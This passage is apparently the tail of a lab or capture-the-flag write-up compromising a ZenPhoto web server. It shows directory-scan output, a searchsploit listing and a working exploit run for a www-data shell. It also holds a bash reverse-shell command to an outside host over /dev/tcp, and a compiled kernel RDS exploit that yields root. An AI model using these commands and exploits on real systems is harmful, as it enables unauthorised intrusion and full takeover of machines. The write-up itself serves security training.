200      GET     1152l     4707w   128871c http://192.168.153.41/test/doc_files/zenphoto_quick_reference.pdf
404      GET        9l       33w      307c http://192.168.153.41/test/themes/zenpage/Home%20Page
404      GET        9l       33w      312c http://192.168.153.41/test/themes/zenpage/Planned%20Giving
404      GET        9l       33w      306c http://192.168.153.41/test/themes/zenpage/Site%20Map
404      GET        9l       33w      291c http://192.168.153.41/test/About%20Us
404      GET        9l       33w      295c http://192.168.153.41/test/Bequest%20Gift
404      GET        9l       33w      292c http://192.168.153.41/test/Gift%20Form
404      GET        9l       34w      299c http://192.168.153.41/test/Life%20Income%20Gift
404      GET        9l       33w      293c http://192.168.153.41/test/New%20Folder
404      GET        9l       33w      300c http://192.168.153.41/test/zp-core/Home%20Page
404      GET        9l       33w      305c http://192.168.153.41/test/zp-core/Press%20Releases
404      GET        9l       33w      305c http://192.168.153.41/test/zp-core/Privacy%20Policy
404      GET        9l       33w      294c http://192.168.153.41/test/Site%20Assets
404      GET        9l       33w      299c http://192.168.153.41/test/zp-core/Site%20Map
404      GET        9l       34w      294c http://192.168.153.41/test/What%20is%20New
404      GET        9l       33w      309c http://192.168.153.41/test/themes/stopdesign/About%20Us
404      GET        9l       33w      309c http://192.168.153.41/test/zp-core/rss/Web%20References
404      GET        9l       33w      313c http://192.168.153.41/test/themes/stopdesign/Bequest%20Gift
404      GET        9l       33w      310c http://192.168.153.41/test/themes/stopdesign/Gift%20Form
404      GET        9l       34w      317c http://192.168.153.41/test/themes/stopdesign/Life%20Income%20Gift
404      GET        9l       33w      305c http://192.168.153.41/test/zp-core/rss/My%20Project
404      GET        9l       33w      312c http://192.168.153.41/test/themes/stopdesign/Site%20Assets
404      GET        9l       33w      306c http://192.168.153.41/test/themes/default/About%20Us
404      GET        9l       34w      312c http://192.168.153.41/test/themes/stopdesign/What%20is%20New
404      GET        9l       33w      306c http://192.168.153.41/test/themes/zenpage/About%20Us
404      GET        9l       33w      309c http://192.168.153.41/test/themes/default/Site%20Assets
404      GET        9l       33w      310c http://192.168.153.41/test/themes/zenpage/Bequest%20Gift
404      GET        9l       33w      317c http://192.168.153.41/test/themes/effervescence_plus/About%20Us
404      GET        9l       33w      309c http://192.168.153.41/test/themes/garland/Site%20Assets
404      GET        9l       34w      309c http://192.168.153.41/test/themes/default/What%20is%20New
404      GET        9l       33w      308c http://192.168.153.41/test/themes/zenpage/New%20Folder
404      GET        9l       33w      305c http://192.168.153.41/test/zp-core/rss/Contact%20Us
404      GET        9l       33w      309c http://192.168.153.41/test/themes/zenpage/Site%20Assets
404      GET        9l       34w      309c http://192.168.153.41/test/themes/zenpage/What%20is%20New
301      GET        9l       28w      334c http://192.168.153.41/test/zp-core/watermarks => http://192.168.153.41/test/zp-core/watermarks/
200      GET       15l       76w     5327c http://192.168.153.41/test/zp-core/watermarks/watermark-text.png
404      GET        9l       33w      303c http://192.168.153.41/test/zp-core/Bequest%20Gift
404      GET        9l       33w      300c http://192.168.153.41/test/zp-core/Gift%20Form
404      GET        9l       33w      301c http://192.168.153.41/test/zp-core/New%20Folder
200      GET       30l      138w    11481c http://192.168.153.41/test/zp-core/watermarks/watermark-video.png
404      GET        9l       33w      302c http://192.168.153.41/test/zp-core/Site%20Assets
404      GET        9l       33w      306c http://192.168.153.41/test/zp-core/rss/Donate%20Cash
404      GET        9l       33w      304c http://192.168.153.41/test/zp-core/rss/Home%20Page
200      GET      165l      918w    79492c http://192.168.153.41/test/zp-core/watermarks/copyright.png
404      GET        9l       33w      309c http://192.168.153.41/test/zp-core/rss/Planned%20Giving
200      GET      236l     1166w   115812c http://192.168.153.41/test/zp-core/watermarks/watermark.png
404      GET        9l       33w      309c http://192.168.153.41/test/zp-core/rss/Press%20Releases
404      GET        9l       33w      309c http://192.168.153.41/test/zp-core/rss/Privacy%20Policy
404      GET        9l       33w      303c http://192.168.153.41/test/zp-core/rss/Site%20Map
404      GET        9l       33w      303c http://192.168.153.41/test/zp-core/rss/About%20Us
404      GET        9l       33w      307c http://192.168.153.41/test/zp-core/rss/Bequest%20Gift
404      GET        9l       33w      304c http://192.168.153.41/test/zp-core/rss/Gift%20Form
404      GET        9l       34w      311c http://192.168.153.41/test/zp-core/rss/Life%20Income%20Gift
404      GET        9l       33w      305c http://192.168.153.41/test/zp-core/rss/New%20Folder
404      GET        9l       33w      306c http://192.168.153.41/test/zp-core/rss/Site%20Assets
404      GET        9l       34w      306c http://192.168.153.41/test/zp-core/rss/What%20is%20New
[####################] - 2m    270316/270316  0s      found:366     errors:2138   
[####################] - 75s    30000/30000   399/s   http://192.168.153.41/ 
[####################] - 85s    30000/30000   351/s   http://192.168.153.41/test/ 
[####################] - 2s     30000/30000   15765/s http://192.168.153.41/test/plugins/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s     30000/30000   461538/s http://192.168.153.41/test/cache/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 2s     30000/30000   15560/s http://192.168.153.41/test/themes/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 2s     30000/30000   15865/s http://192.168.153.41/test/plugins/watermarks/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s     30000/30000   454545/s http://192.168.153.41/test/plugins/gd_fonts/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 83s    30000/30000   362/s   http://192.168.153.41/test/themes/default/ 
[####################] - 0s     30000/30000   483871/s http://192.168.153.41/test/albums/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 1s     30000/30000   33822/s http://192.168.153.41/test/plugins/flag_thumbnail/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s     30000/30000   508475/s http://192.168.153.41/test/plugins/imagick_fonts/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s     30000/30000   526316/s http://192.168.153.41/test/uploaded/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s     30000/30000   416667/s http://192.168.153.41/test/plugins/flvplayer/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 85s    30000/30000   351/s   http://192.168.153.41/test/themes/zenpage/ 
[####################] - 85s    30000/30000   351/s   http://192.168.153.41/test/themes/garland/ 
[####################] - 82s    30000/30000   366/s   http://192.168.153.41/test/themes/stopdesign/ 
[####################] - 85s    30000/30000   353/s   http://192.168.153.41/test/themes/effervescence_plus/
```

There seems to be an application named "ZenPhoto" and an admin panel on:

```
http://192.168.153.41/test/zp-core/admin.php
```


## Vulnerability Assessment

Let's check for RCE CVE's for this application.

```
searchsploit ZenPhoto                
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
ZenPhoto - 'admin-news-articles.php' Cross-Site Scripting                                                                                                                                                 | php/webapps/37903.txt
ZenPhoto - 'index.php' SQL Injection                                                                                                                                                                      | php/webapps/38326.txt
ZenPhoto - Config Update / Command Execution                                                                                                                                                              | php/webapps/15114.php
ZenPhoto - SQL Injection                                                                                                                                                                                  | php/webapps/39062.txt
ZenPhoto 0.9/1.0 - 'i.php?a' Cross-Site Scripting                                                                                                                                                         | php/webapps/27795.txt
ZenPhoto 0.9/1.0 - 'index.php' Multiple Cross-Site Scripting Vulnerabilities                                                                                                                              | php/webapps/27796.txt
ZenPhoto 1.1.3 - 'rss.php?albumnr' SQL Injection                                                                                                                                                          | php/webapps/4823.pl
ZenPhoto 1.2.5 - Completely Blind SQL Injection                                                                                                                                                           | php/webapps/9154.js
ZenPhoto 1.3 - '/zp-core/admin.php' Multiple Cross-Site Scripting Vulnerabilities                                                                                                                         | php/webapps/34611.txt
ZenPhoto 1.3 - '/zp-core/full-image.php?a' SQL Injection                                                                                                                                                  | php/webapps/34610.txt
ZenPhoto 1.4.0.3 - '_zp_themeroot' Multiple Cross-Site Scripting Vulnerabilities                                                                                                                          | php/webapps/35648.txt
ZenPhoto 1.4.0.3 - x-forwarded-for HTTP Header Persistent Cross-Site Scripting                                                                                                                            | php/webapps/17200.txt
ZenPhoto 1.4.1.4 - 'ajax_create_folder.php' Remote Code Execution                                                                                                                                         | php/webapps/18083.php
ZenPhoto 1.4.10 - Local File Inclusion                                                                                                                                                                    | php/webapps/38841.txt
ZenPhoto 1.4.11 - Remote File Inclusion                                                                                                                                                                   | php/webapps/39571.txt
ZenPhoto 1.4.3.3 - Multiple Vulnerabilities                                                                                                                                                               | php/webapps/22524.txt
ZenPhoto 1.4.8 - Multiple Vulnerabilities                                                                                                                                                                 | php/webapps/37602.txt
Zenphoto 1.6 - Multiple stored XSS                                                                                                                                                                        | php/webapps/51485.txt
ZenPhoto CMS 1.3 - Multiple Cross-Site Request Forgery Vulnerabilities                                                                                                                                    | php/webapps/14359.html
ZenPhoto Gallery 1.2.5 - Admin Password Reset (Cross-Site Request Forgery)                                                                                                                                | php/webapps/9166.txt
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

We are able to utilize the following command in order to exploit the target system.

```
php/webapps/18083.php
```

## Initial Access


Ran the exploit with the following syntax & gained an shell as user "www-data" on the target system.

```
php exploit.php 192.168.153.41 /test/        

+-----------------------------------------------------------+
| Zenphoto <= 1.4.1.4 Remote Code Execution Exploit by EgiX |
+-----------------------------------------------------------+

zenphoto-shell# whoami
www-data
```

Retrieved local.txt in /home directory.

```
67aa60df34b0380d2f2a228722654bb4
```

The Shell seems to be extremely weak, let's get an reverse connection using bash!

Started up my listener on port 80.

```
nc -lvnp 80
```

Utilized the following command to get an RCE back.

```
zenphoto-shell# /bin/bash -c 'bash -i >& /dev/tcp/192.168.45.192/80 0>&1'
```
```
nc -lvnp 80
listening on [any] 80 ...
connect to [192.168.45.192] from (UNKNOWN) [192.168.153.41] 43601
bash: no job control in this shell
<p-extensions/tiny_mce/plugins/ajaxfilemanager/inc$
```

## Privilege Escalation

I identified an pretty old Linux Kernel.

```
www-data@offsecsrv:/$ uname -a
Linux offsecsrv 2.6.32-21-generic #32-Ubuntu SMP Fri Apr 16 08:10:02 UTC 2010 i686 GNU/Linux
```

Immediatly found an exploit which should grant us root rights.

Since the exploit is written in .c and not compiled yet, I will recheck if gcc is installed on the target, it is!

```
www-data@offsecsrv:/$ which gcc
/usr/bin/gcc
```

I copy pasted the raw source code of the exploit into an exploit.c file in the /tmp directory.

```
https://www.exploit-db.com/raw/15285
```

Compiled the initial file.

```
gcc exploit.c -o exploit
```

Ran the exploit & gained root shell.

```
www-data@offsecsrv:/tmp$ ./exploit
[*] Linux kernel >= 2.6.30 RDS socket exploit
[*] by Dan Rosenberg
[*] Resolving kernel addresses...
 [+] Resolved security_ops to 0xc08c8c2c
 [+] Resolved default_security_ops to 0xc0773300
 [+] Resolved cap_ptrace_traceme to 0xc02f3dc0
 [+] Resolved commit_creds to 0xc016dcc0
 [+] Resolved prepare_kernel_cred to 0xc016e000
[*] Overwriting security ops...
[*] Overwriting function pointer...
[*] Triggering payload...
[*] Restoring function pointer...
[*] Got root!
# whoami
root
```

Retrieved proof.txt in /root directory.

```
b4eb1541a18632d2cfc19be33e85fd89
```
